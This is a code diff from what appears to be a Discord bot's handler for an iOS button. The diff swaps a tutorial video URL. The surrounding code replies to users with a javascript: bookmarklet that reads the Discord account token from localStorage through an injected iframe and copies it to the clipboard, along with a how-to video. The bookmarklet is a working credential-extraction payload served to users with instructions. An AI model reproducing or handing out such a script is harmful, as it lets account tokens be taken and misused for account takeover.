@@ -550,7 +550,7 @@ export async function handlePlatformButton(interaction) {
     if (customId === 'btn_ios') {
         const iosScript = `javascript:(function(){try{var i=document.createElement('iframe');document.body.appendChild(i);var t=JSON.parse(i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1'));navigator.clipboard.writeText(t).then(function(){var d=document.createElement('div');d.innerHTML='<strong>Token Copied</strong><br>Your token has been copied to clipboard';Object.assign(d.style,{position:'fixed',top:'10px',left:'10px',background:'#d4edda',color:'#155724',padding:'10px',border:'1px solid #c3e6cb',borderRadius:'5px',zIndex:99999,fontFamily:'sans-serif'});document.body.appendChild(d);setTimeout(()=>d.remove(),3000);});}catch(e){alert('Failed to copy token: '+e);}})();`;
         
-        const iosVideo = 'https://cdn.discordapp.com/attachments/1539823157425348758/1540748022399504404/VN20260307_122317.mp4';
+        const iosVideo = 'https://cdn.discordapp.com/attachments/1539823157425348758/1541316029718732850/lv_0_20260824110324.mp4?ex=6a8d25e9&is=6a8bd469&hm=7a2d00bbf843271a7af199da483674f24f3f5e21482903574f09f0ab0f6dab02&';
 
         await interaction.reply({
             content: `\`\`\n${iosScript}\n\`\`\n${iosVideo}`,
